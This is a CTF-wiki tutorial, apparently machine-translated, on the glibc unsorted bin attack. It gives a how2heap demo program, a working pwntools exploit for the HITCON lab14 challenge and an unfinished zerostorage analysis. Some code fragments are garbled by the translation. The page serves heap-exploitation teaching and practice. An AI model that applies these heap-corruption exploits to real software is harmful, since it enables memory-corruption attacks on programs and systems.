[EN](./unsorted_bin_attack.md) | [ZH](./unsorted_bin_attack-zh.md)
---

typora-root-url: ../../../docs

---



# Unsorted Bin Attack



## Overview


Unsorted Bin Attack, as the name implies, is closely related to the mechanism of Unsorted Bin in Glibc heap management.


The premise that Unsorted Bin Attack is exploited is to control the bk pointer of Unsorted Bin Chunk.


The effect that Unsorted Bin Attack can achieve is to implement a modification of any address value to a larger value.


## Unsorted Bin Review


Before introducing the Unsorted Bin attack, you can review the basic source and basic usage of Unsorted Bin.


### Basic source


1. When a large chunk is split into two halves, if the rest is greater than MINSIZE, it will be placed in the unsorted bin.
2. When a chunk that does not belong to the fast bin is released, and the chunk is not in close proximity to the top chunk, the chunk is first placed in the unsorted bin. For an explanation of the top chunk, please refer to the introduction below.
3. When malloc_consolidate is executed, the merged chunk may be placed in the unsorted bin if it is not close to the top chunk.


### Basic usage


1. Unsorted Bin In the process of using, the traversal order used is FIFO, ** is inserted into the head of the unsorted bin when it is inserted, and gets ** from the end of the list when it is taken out.
2. When the program malloc, if the chunk of the corresponding size is not found in the fastbin, small bin, it will try to find the chunk from the Unsorted Bin. If the size of the chunk that is taken out is just enough, it will be returned directly to the user, otherwise the chunks will be inserted into the corresponding bin.


## Principle


In [glibc](https://code.woboq.org/userspace/glibc/)/[malloc](https://code.woboq.org/userspace/glibc/malloc/)/[malloc.c](https `_int_malloc ` in ://code.woboq.org/userspace/glibc/malloc/malloc.c.html) has such a piece of code that will take the position of `bck-&gt;fd` when an unsorted bin is taken out. Write to the location of this Unsorted Bin.


```C

          /* remove from unsorted list */

          if (__glibc_unlikely (bck->fd != victim))

            malloc_printerr ("malloc(): corrupted unsorted chunks 3");

unsorted_chunks (off) -&gt; bk = bck;
bck-&gt; fd = unsorted_chunks (off);
```



In other words, if we control the value of bk, we can write `unsorted_chunks (av)` to any address.






Here I will take [unsorted_bin_attack.c] (https://github.com/shellphish/how2heap/blob/master/unsorted_bin_attack.c) in shellphish&#39;s how2heap repository as an example. Here I make some simple modifications, as follows


```c

#include <stdio.h>

#include <stdlib.h>



int main() {

  fprintf(stderr, "This file demonstrates unsorted bin attack by write a large "

                  "unsigned long value into stack\n");

  fprintf(

      stderr,

      "In practice, unsorted bin attack is generally prepared for further "

      "attacks, such as rewriting the "

      "global variable global_max_fast in libc for further fastbin attack\n\n");



  unsigned long target_var = 0;

  fprintf(stderr,

          "Let's first look at the target we want to rewrite on stack:\n");

  fprintf(stderr, "%p: %ld\n\n", &target_var, target_var);



  unsigned long *p = malloc(400);

  fprintf(stderr, "Now, we allocate first normal chunk on the heap at: %p\n",

          p);

  fprintf(stderr, "And allocate another normal chunk in order to avoid "

                  "consolidating the top chunk with"

                  "the first one during the free()\n\n");

  malloc(500);



  free(p);

  fprintf(stderr, "We free the first chunk now and it will be inserted in the "

                  "unsorted bin with its bk pointer "

                  "point to %p\n",

          (void *)p[1]);



  /*------------VULNERABILITY-----------*/



  p[1] = (unsigned long)(&target_var - 2);

  fprintf(stderr, "Now emulating a vulnerability that can overwrite the "

                  "victim->bk pointer\n");

  fprintf(stderr, "And we write it with the target address-16 (in 32-bits "

                  "machine, it should be target address-8):%p\n\n",

          (void *)p[1]);



  //------------------------------------



  malloc(400);

  fprintf(stderr, "Let's malloc again to get the chunk we just free. During "

                  "this time, target should has already been "

                  "rewrite:\n");

  fprintf(stderr, "%p: %p\n", &target_var, (void *)target_var);

}

```



The effect after the program is executed is


```shell

➜  unsorted_bin_attack git:(master) ✗ gcc unsorted_bin_attack.c -o unsorted_bin_attack

➜  unsorted_bin_attack git:(master) ✗ ./unsorted_bin_attack

This file demonstrates unsorted bin attack by write a large unsigned long value into stack

In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the global variable global_max_fast in libc for further fastbin attack



Let's first look at the target we want to rewrite on stack:

0x7ffe0d232518: 0



Now, we allocate first normal chunk on the heap at: 0x1fce010

And allocate another normal chunk in order to avoid consolidating the top chunk withthe first one during the free()



We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer point to 0x7f1c705ffb78

Now emulating a vulnerability that can overwrite the victim->bk pointer

And we write it with the target address-16 (in 32-bits machine, it should be target address-8):0x7ffe0d232508



Let's malloc again to get the chunk we just free. During this time, target should has already been rewrite:

0x7ffe0d232518: 0x7f1c705ffb78

```



Here we can use a diagram to describe the specific process and the principles behind it.


![](./figure/unsorted_bin_attack_order.png)



**In the initial state**


The fd and bk of the unsorted bin point to the unsorted bin itself.

**Execute free(p)**


Since the size of the released chunk is not in the range of the fast bin, it is first placed in the unsorted bin.


**Modify p[1]**


After modification, the bk pointer of p in the unsorted bin will point to the fake chunk at target addr-16, that is, the Target Value is at the fd of the fake chunk.


**Request a 400-size chunk**


At this point, the requested chunk is in the range of the small bin, and there is no chunk in the corresponding bin, so it will go to the unsorted bin and find that the unsorted bin is not empty, so the last chunk in the unsorted bin is taken out.


```c

while ((victim = unsorted_chunks (off) -&gt; bk)! = unsorted_chunks (off)) {
            bck = victim->bk;

            if (__builtin_expect(chunksize_nomask(victim) <= 2 * SIZE_SZ, 0) ||

                __builtin_expect(chunksize_nomask(victim) > av->system_mem, 0))

                malloc_printerr(check_action, "malloc(): memory corruption",

chunk2mem (victim), off);
            size = chunksize(victim);



            /*

               If a small request, try to use last remainder if it is the

               only chunk in unsorted bin.  This helps promote locality for

               runs of consecutive small requests. This is the only

               exception to best-fit, and applies only when there is

               no exact fit for a small chunk.

             */

/* Obviously, bck has been modified and does not meet the requirements here*/
            if (in_smallbin_range(nb) && bck == unsorted_chunks(av) &&

victim == off-&gt; last_remainder &amp;&amp;
                (unsigned long) (size) > (unsigned long) (nb + MINSIZE)) {

				....

            }



            /* remove from unsorted list */

unsorted_chunks (off) -&gt; bk = bck;
bck-&gt; fd = unsorted_chunks (off);
```



- victim = unsorted_chunks (off) -&gt; bk = p
- bck = victim->bk=p->bk = target addr-16

- unsorted_chunks(av)->bk = bck=target addr-16

- bck->fd                 = *(target addr -16+16) = unsorted_chunks(av);



** It can be seen that in the process of taking the last chunk of the unsorted bin, the victim&#39;s fd does not work, so even if we modify it to an illegal value, it does not matter. ** However, it should be noted that the unsorted bin list may be destroyed, and problems may occur when inserting chunks.


That is, the value of the target is changed to the linked table header 0x7f1c705ffb78 of the unsorted bin, which is the previously output information.


```shell

We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer point to 0x7f1c705ffb78

Now emulating a vulnerability that can overwrite the victim->bk pointer

And we write it with the target address-16 (in 32-bits machine, it should be target address-8):0x7ffe0d232508



Let's malloc again to get the chunk we just free. During this time, target should has already been rewrite:

0x7ffe0d232518: 0x7f1c705ffb78

```



Here we can see that the unsorted bin attack can indeed modify the value of any address, but the value modified is not controlled by us. The only thing we can know is that this value is relatively large. **And, it’s important to note that **


This doesn&#39;t seem to be useful, but it&#39;s still a bit of an egg, for example


- We can make the program execute multiple loops by modifying the number of loops.
- We can modify the global_max_fast in the heap to make the larger chunks look like fast bins, so we can perform some fast bin attacks.


## HITCON Training lab14 magic heap

[Topic link] (https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unsorted_bin_attack/hitcontraining_lab14)


Here we modify the l33t function in the source program so that it can run normally.


```c

void l33t() { system("cat ./flag"); }

```



### Basic Information


```shell

➜  hitcontraining_lab14 git:(master) file magicheap

magicheap: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=9f84548d48f7baa37b9217796c2ced6e6281bb6f, not stripped

➜  hitcontraining_lab14 git:(master) checksec magicheap

[*] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/unsorted_bin_attack/hitcontraining_lab14/magicheap'

    Arch:     amd64-64-little

    RELRO:    Partial RELRO

    Stack:    Canary found

    NX:       NX enabled

    PIE:      No PIE (0x400000)

```



It can be seen that the program is a dynamically linked 64 program, which mainly opens NX protection and Canary protection.


### basic skills


The program is probably the heap manager that I wrote myself. It mainly has the following functions.


1. Create a heap. The corresponding heap is requested according to the user-specified size, and the content of the specified length is read, but NULL is not set.
2. Edit the heap. According to the specified index, it is judged whether the corresponding heap is non-empty. If it is not empty, the content of the heap is modified according to the size read by the user. Here, a vulnerability of any length heap overflow occurs.
3. Delete the heap. Determine whether the corresponding heap is non-empty according to the specified index. If it is not empty, release the corresponding heap and set it to NULL.


At the same time, we see that when we control v3 to 4869 and control magic to be greater than 4869, we can get the flag.


### Use


Obviously, we can use the unsorted bin attack directly.


1. Release a heap to the unsorted bin.
2. Use the heap overflow vulnerability to modify the bk pointer of the corresponding heap block in the unsorted bin to &amp;magic-16.
3. Trigger the vulnerability.


code show as below


```Python

#!/usr/bin/env python

# -*- coding: utf-8 -*-

from pwn import *



r = process('./magicheap')





def create_heap(size, content):

    r.recvuntil(":")

    r.sendline("1")

    r.recvuntil(":")

    r.sendline(str(size))

    r.recvuntil(":")

    r.sendline(content)




def edit_heap(idx, size, content):

    r.recvuntil(":")

    r.sendline("2")

    r.recvuntil(":")

    r.sendline(str(idx))

    r.recvuntil(":")

    r.sendline(str(size))

    r.recvuntil(":")

    r.sendline(content)





def del_heap(idx):

    r.recvuntil(":")

    r.sendline("3")

    r.recvuntil(":")

    r.sendline(str(idx))





create_heap(0x20, "dada")  # 0

create_heap(0x80, "dada")  # 1

# in order not to merge into top chunk

create_heap(0x20, "dada")  # 2



del_heap (1)


magic = 0x6020c0

fd = 0
bk = magic - 0x10



edit_heap(0, 0x20 + 0x20, "a" * 0x20 + p64(0) + p64(0x91) + p64(fd) + p64(bk))

create_heap(0x80, "dada")  #trigger unsorted bin attack

r.recvuntil(":")

r.sendline("4869")

r.interactive()



```



## 2016 0CTF zerostorage-To be completed


**Note: To be completed further. **


Here we introduce the [zerostorage] (https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unsorted_bin_attack/zerostorage) of 0CTF 2016 as an example.


** This question was given to the server version and kernel version of the server, so I can debug it exactly the next time. Here we will debug directly with our local machine. However, in the current Ubuntu 16.04, due to further randomization, the relative offset between the location where libc is loaded and the location where the program module is loaded is no longer fixed, so the strategy of BriefX cannot be used again. It seems that only angelboy can be used. Strategy. **


### Security check


It can be seen that the program has opened all protections.


```shell

pwndbg> checksec

[*] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/unsorted_bin_attack/zerostorage/zerostorage'

    Arch:     amd64-64-little

    RELRO:    Full RELRO

    Stack:    Canary found

    NX:       NX enabled

    PIE:      PIE enabled

    FORTIFY:  Enabled

```



### Basic function analysis


The program manages the storage space in the bss segment, with the functions of insert, delete, merge, delete, view, enumerate, and exit. The structure of this storage is as follows


```text

00000000 Storage         struc ; (sizeof=0x18, mappedto_7)

00000000                                         ; XREF: .bss:storage_list/r

00000000 use             dq ?

00000008 size            dq ?

00000010 xor_addr        dq ?

00000018 Storage         ends

```



#### insert-1



The basic functions are as follows


1. Look at the storage array one by one to find the first unused element, but this array is up to 32.
2. The length of the content that needs to be stored to read the storage element.
- If the length is not greater than 0, exit directly;
- Otherwise, if the number of bytes requested is less than 128, it is set to 128;
- Otherwise, if the number of bytes requested is not greater than 4096, it is set to the corresponding value;
- Otherwise, set to 4096.
3. Use calloc to assign the specified length. Note that calloc will initialize chunk to 0.
4. Suppress the memory address assigned by the calloc with a memory of the bss segment (the initial time is a random number) to get a new memory address.
5. Read in the content according to the size of the stored storage.
6. Save the size of the corresponding storage and the address of the stored content to the corresponding storage element and mark the element as available. ** However, it should be noted that the size of the storage recorded here is the size of your own input! ! ! **
7. Increment the number of storage num.


#### update-2



1. If there is no storage, return directly.
2. Read the id of the storage element to be updated. If the id is greater than 31 or is currently not in use, the description is incorrect and returns directly.
3. Read the length of the content that the **storage element needs to store after the ** update.
- If the length is not greater than 0, exit directly;
- Otherwise, if the number of bytes requested is less than 128, it is set to 128;
- Otherwise, if the number of bytes requested is not greater than 4096, it is set to the corresponding value;
- Otherwise, set to 4096.
4. Obtain the address of the original storage content according to the random number corresponding to the bss segment.
5. If the length required after the update is not equal to the length before the update, use realloc to reassign the memory.
6. Read the data again and update the storage element.


#### merge-3


1. If the element being used is no more than one, then you cannot merge and you can exit directly.
2. Determine if the storage is full. If it is not full, find the free one.
3. Read the id of merge_from and the id number of merge_to, respectively, and detect the corresponding size and usage status.
4. Calculate the space required for the two merges together based on the size of the initial user input. ** If it is not greater than 128, then it will not apply for a new space**, otherwise apply for a new space of the corresponding size.
5. Copy the contents of merge_to and merge_from to the corresponding location.
6. The memory address of the last stored merge_from content was released, but was not set to NULL. At the same time, the memory address for storing the merge_to content is not released, and the corresponding storage address or the subsequent address is only set to NULL. **


** But it should be noted that, at the time of merge, it is not detected whether the IDs of the two storages are the same. **


#### delete-4



1. If no elements are stored, return directly.
2. Read the id of the element specifying the storage to be modified. If the id is greater than 32, it will return directly.
3. If the corresponding element of storage is not in use, it will also return.
4. After that, the fields corresponding to the elements are set to NULL and the corresponding memory is released.


#### view-5



1. If no elements are stored, return directly.
2. Read the id of the element specifying the storage to be modified. If the id is greater than 32, it will return directly.
3. If the corresponding element of storage is not in use, it will also return.
4. Enter the contents of the corresponding storage.

#### list-6



1. If no elements are stored, return directly.
2. Read the id of the element specifying the storage to be modified. If the id is greater than 32, it will return directly.
3. Traverse all the storages in use, enter their corresponding subscripts and the size of the corresponding storage.


### Vulnerability determination


Through such a simple analysis, we can basically determine that the vulnerability is mainly concentrated in the insert operation and the merge operation, especially when we merge two smaller size storage, there will be some problems.


Let&#39;s take a detailed analysis. If we insert a smaller size (such as 8) storage A in the insert process, then when we merge, let&#39;s say that we select the two storages of merge are A, then the program will Directly, the content of A will be added directly to the original content of A, and then the memory of the corresponding data portion of A will be freed, but this does not have any effect, because the address of A storage content is Assigned to another storage, when accessing the contents of the storage B part of the merge, since the address of the stored data part of B is actually the address of the stored data corresponding to A, the content of the data part of A is printed. However, we just released the memory corresponding to A, and A is not in the fast bin range, so it will only be placed in the unsorted bin (and only one at this time), so the fd and bk of A are stored at this time. Is a base address of the unsorted bin.


If we have deleted a storage C before the merge, then after we merge A, A will be inserted in the header of the unsorted bin&#39;s doubly linked list, so its fd is the address corresponding to C, and bk is a base of unsorted bin. address. This way we can directly leak two addresses.


And it should be noted that we can still modify the content of B after the merge, so this is actually a Use After Free.


### Utilization process


- Unsorted Bin Attack



Use the unsorted bin attack to modify the global_max_fast global variable. Since the global_max_fast variable is the size of the largest Fast chunk, it is rewritten as the address of the unsorted bin (generally a large positive number), so that the subsequent chunks can be made. Being used as a fast chunk, you can do a Fast bin attack.


- Fast Bin Attack



  



## topic


### references


- http://brieflyx.me/2016/ctf-writeups/0ctf-2016-zerostorage/

- https://github.com/HQ1995/Heap_Senior_Driver/tree/master/0ctf2016/zerostorage

- https://github.com/scwuaptx/CTF/blob/master/2016-writeup/0ctf/zerostorage.py
